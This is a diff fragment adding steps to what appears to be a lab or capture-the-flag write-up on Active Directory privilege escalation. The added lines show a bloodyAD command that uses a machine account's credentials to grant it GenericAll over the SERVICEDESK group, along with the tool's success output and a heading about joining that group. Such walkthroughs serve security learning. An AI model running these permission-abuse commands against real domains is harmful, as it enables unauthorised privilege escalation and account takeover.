@@ -286,5 +286,14 @@ Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies
 First ill grant ownership to myself
 
 ```python
+bloodyAD --host dc.hsm-defense.local -d hsm-defense.local -u 'helpdesk01$' -p 'Password123' -k add genericAll 'CN=SERVICEDESK,CN=USERS,DC=HSM-DEFENSE,DC=LOCAL' 'helpdesk01$'
+[+] helpdesk01$ has now GenericAll on CN=SERVICEDESK,CN=USERS,DC=HSM-DEFENSE,DC=LOCAL
+```
+
+I now have full control over the group
+
+# Adding `helpdesk01$` to `servicedesk` group
+
+```python
 
 ```
